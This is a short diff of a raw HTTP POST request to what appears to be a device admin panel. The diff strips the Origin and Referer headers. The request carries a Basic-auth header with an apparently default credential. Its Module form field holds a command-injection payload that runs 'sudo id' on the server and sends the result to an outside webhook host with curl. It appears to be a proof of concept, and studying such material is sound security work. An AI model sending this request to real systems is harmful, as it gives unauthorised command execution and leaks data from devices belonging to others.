@@ -13,10 +13,8 @@ Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 115
-Origin: http://121.169.46.217
 Authorization: Basic cGktc3RhcjpyYXNwYmVycnk=
 Connection: close
-Referer: http://121.169.46.217/admin/admin.php
 Upgrade-Insecure-Requests: 1
 
 RefName=REF001&Letter=C&Link=UNLINK&Module=$(curl%20http://webhook.site/xxxx/$(sudo%20id))
